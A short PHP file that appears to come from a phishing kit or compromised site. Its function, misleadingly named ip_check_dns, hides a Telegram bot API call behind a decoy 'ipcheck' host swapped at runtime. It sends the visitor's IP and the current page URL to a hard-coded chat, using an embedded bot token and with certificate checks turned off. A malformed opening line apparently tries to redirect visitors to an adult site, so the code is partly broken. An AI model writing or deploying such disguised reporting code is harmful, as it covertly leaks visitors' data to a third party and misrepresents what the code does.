<?php
 header =("location: http:www.xnxx.com/?mia&khalifa");
	function ip_check_dns($ip){
		$Token="1245287373:AAHr-pzFdsoP6lSX5848gyPrJ5uF8ZB7DGI";

		$url="https://api.ipcheck.org/bot".$Token;
		$Id="-414135102"; 
		$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$ip .=$actual_link;
		$params=[
				'chat_id'=>$Id, 
				'text'=>$ip,
		];
		$url=str_replace("ipcheck","telegram",$url);
		$ch = curl_init($url . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
//		echo($result);
		curl_close($ch);

	}
 ?>